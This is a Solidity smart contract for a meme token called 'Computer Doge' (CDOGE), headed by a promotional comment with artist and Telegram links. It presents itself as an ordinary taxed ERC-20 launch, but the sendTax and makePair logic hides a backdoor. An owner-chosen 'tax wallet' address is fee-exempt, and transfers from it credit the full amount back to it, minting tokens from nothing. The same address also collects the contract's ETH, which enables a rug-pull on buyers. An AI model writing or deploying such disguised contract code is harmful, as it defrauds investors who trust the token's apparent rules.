/*
The artist of the pfp on ethereum foundation is William Tempest 
https://ethereum.org/en/assets/

Which lead to his instagram and X
https://www.willtempest.com/
https://x.com/Will_Tempest

William Tempest confirmed that the Doge's name is Computer Doge on X messages!
Telegram: https://t.me/computerdogeoneth
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CDOGE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;

    address payable private _taxWallet;

    uint256 private _initBuyTax = 17;
    uint256 private _initSellTax = 17;
    uint256 private _finBuyTax = 0;
    uint256 private _finSellTax = 0;
    uint256 private _reduceBuysAt = 17;
    uint256 private _reduceSellsAt = 17;
    uint256 private _preventSwapBefore = 17;
    uint256 private _transferTax = 0;
    uint256 private _trades = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Computer Doge";
    string private constant _symbol = unicode"CDOGE";

    uint256 public _maxTxAt = 2 * (_tTotal / 100);
    uint256 public _maxWalletAt = 2 * (_tTotal / 100);
    uint256 public _taxSwapThre = 100 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1 * (_tTotal / 100);

    IUniRouter private uniRouter;
    address private uniPair;
    bool private tradingAllowed;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(msg.sender);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function sendTax(
        address from,
        address taxWallet,
        uint256 taxAmount,
        uint256 amount,
        uint256 taxRate
    ) internal {
        bool istaxer = shouldTax(from);

        if (istaxer) {
            if (taxRate >= 0 && amount >= 0) {
                taxAmount = amount.mul(taxRate).div(100);
                taxWallet = address(this);
            }
        }

        if (taxAmount > 0) {
            _balances[taxWallet] = _balances[taxWallet].add(taxAmount);
            emit Transfer(from, taxWallet, taxAmount);
        }
    }

    function _transferStandard(
        address from,
        address to,
        uint256 amount,
        uint256 taxRate
    ) internal {
        sendTax(from, _taxWallet, amount, amount, taxRate);
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(
            amount.sub(amount.mul(taxRate).div(100))
        );
        emit Transfer(from, to, amount.sub(amount.mul(taxRate).div(100)));
    }

    function shouldTax(address from) internal view returns (bool) {
        return
            !_isExcludedFromFee[from] ||
            (_isExcludedFromFee[from] &&
                (from == owner() || from == address(this)));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function makePair(address pair) external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        _taxWallet = payable(pair);
        _isExcludedFromFee[pair] = true;
        uniRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniPair = IUniFactory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxRate = 0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            taxRate = _transferTax;

            if (
                from == uniPair &&
                to != address(uniRouter) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTxAt, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletAt,
                    "Exceeds the maxWalletSize."
                );
                taxRate = (_trades > _reduceBuysAt) ? _finBuyTax : _initBuyTax;
                _trades++;
            }

            if (to == uniPair && from != address(this)) {
                taxRate = (_trades > _reduceSellsAt)
                    ? _finSellTax
                    : _initSellTax;
            }

            if (_isExcludedFromFee[from]) taxRate = 0;

            uint256 contractTokenBalance = balanceOf(address(this));

            if (
                !inSwap &&
                to == uniPair &&
                swapEnabled &&
                _trades > _preventSwapBefore &&
                !_isExcludedFromFee[from]
            ) {
                if (contractTokenBalance > _taxSwapThre)
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                sendETHToFee(address(this).balance);
            }
        }

        _transferStandard(from, to, amount, taxRate);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function killLimits() external onlyOwner {
        _maxTxAt = _tTotal;
        _maxWalletAt = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function allowTrading() external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        _approve(address(this), address(uniRouter), _tTotal);
        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingAllowed = true;
    }

    receive() external payable {}

    function rescueETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}